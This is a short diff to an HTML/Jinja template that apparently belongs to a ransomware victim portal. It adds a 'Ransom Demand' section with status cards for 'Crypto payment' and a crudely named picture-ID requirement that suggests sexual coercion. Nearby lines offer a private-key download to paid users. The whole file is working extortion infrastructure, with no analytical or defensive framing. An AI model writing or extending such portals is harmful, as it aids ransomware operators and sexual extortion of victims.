@@ -131,6 +131,42 @@
             <a href="{{ url_for('download_private_key', uid=paid_user.uid) }}" class="btn btn-secondary">Private Key</a>
         {% endif %}
     </footer>
+
+    <div class="container mt-5">
+        <!-- Container title centered -->
+        <h2 class="text-center mb-4">Ransom Demand</h2>
+
+        <div class="row justify-content-center">
+            <!-- First card -->
+            <div class="col-md-4">
+                <div class="card">
+                    <div class="card-header text-center">
+                        Crypto payment
+                    </div>
+                    {% if user.status %}
+                    <img src="{{ url_for('static', filename='images/greencheck.png') }}" class="card-img-top mx-auto d-block" alt="Image 1">
+                    {% else %}
+                    <img src="{{ url_for('static', filename='images/redmark.png') }}" class="card-img-top mx-auto d-block" alt="Image 1">
+                    {% endif %}
+                </div>
+            </div>
+
+            <!-- Second card -->
+            <div class="col-md-4">
+                <div class="card">
+                    <div class="card-header text-center">
+                        Pussy ID
+                    </div>
+                    {% if user.pic_id %}
+                    <img src="{{ url_for('static', filename='images/greencheck.png') }}" class="card-img-top mx-auto d-block" alt="Image 1">
+                    {% else %}
+                    <img src="{{ url_for('static', filename='images/redmark.png') }}" class="card-img-top mx-auto d-block" alt="Image 1">
+                    {% endif %}
+                </div>
+            </div>
+        </div>
+    </div>
+
     <br><br>
     {% if user %}
         <h3>Instructions:</h3>
